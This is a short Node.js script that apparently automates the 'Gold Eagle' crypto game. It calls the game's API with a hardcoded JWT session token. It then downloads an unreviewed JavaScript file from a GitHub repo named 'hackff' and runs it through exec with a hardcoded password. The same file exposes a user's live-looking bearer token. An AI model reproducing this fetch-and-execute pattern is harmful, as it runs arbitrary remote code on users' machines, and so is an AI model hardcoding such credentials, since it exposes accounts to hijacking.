// main.mjs
import fetch from 'node-fetch';
import { exec } from 'child_process';
import fs from 'fs';
import path, { dirname } from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const GOLD_EAGLE_URL = 'https://gold-eagle-api.fly.dev/user/me';
const GITHUB_JS_URL = 'https://raw.githubusercontent.com/hackff1/hackff/main/c3-eagl.js';
const PASSWORD = 'foketcrypto'; // Password for the GitHub JS script
const AUTH_TOKEN = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7ImlkIjoiMmQ3YzAxZWMtZTQyYi00NjY4LWJiYzktNDliZDY3ZmViMzdkIiwiZmlyc3RfbmFtZSI6IlNhbG1hbiIsImxhbmd1YWdlX2NvZGUiOiJlbiIsInVzZXJuYW1lIjpudWxsfSwic2Vzc2lvbl9pZCI6MTQ1NTkyMSwic3ViIjoiMmQ3YzAxZWMtZTQyYi00NjY4LWJiYzktNDliZDY3ZmViMzdkIiwiZXhwIjoxNzQzMTUzNzM0fQ.NQ0AkZiRngufL4iW-aeoAH6gwi3JYFTkcN3ysOo1Yos'; // Add your actual token here

// Function to fetch and execute the JS script from GitHub
async function fetchAndRunScript() {
    try {
        // Fetch JS script
        const res = await fetch(GITHUB_JS_URL);
        const scriptText = await res.text();

        // Save to a local JS file
        const scriptPath = path.join(__dirname, 'fetched-script.js');
        fs.writeFileSync(scriptPath, scriptText);

        // Execute the script using Node.js, passing the password as an argument
        exec(`node ${scriptPath} ${PASSWORD}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing script: ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Script stderr: ${stderr}`);
                return;
            }
            console.log(`Script output: ${stdout}`);
        });
    } catch (err) {
        console.error('Error fetching and running the script:', err);
    }
}

// Function to authenticate and perform actions on Gold Eagle website
async function authenticateGoldEagle() {
    try {
        const res = await fetch(GOLD_EAGLE_URL, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${AUTH_TOKEN}`,
                'Accept': 'application/json',
            },
        });

        const data = await res.json();
        console.log('Authenticated User Data:', data);

        // Run your custom logic here with authenticated data

    } catch (err) {
        console.error('Error authenticating:', err);
    }
}

// Main function
async function main() {
    await authenticateGoldEagle();
    await fetchAndRunScript();
}

main();
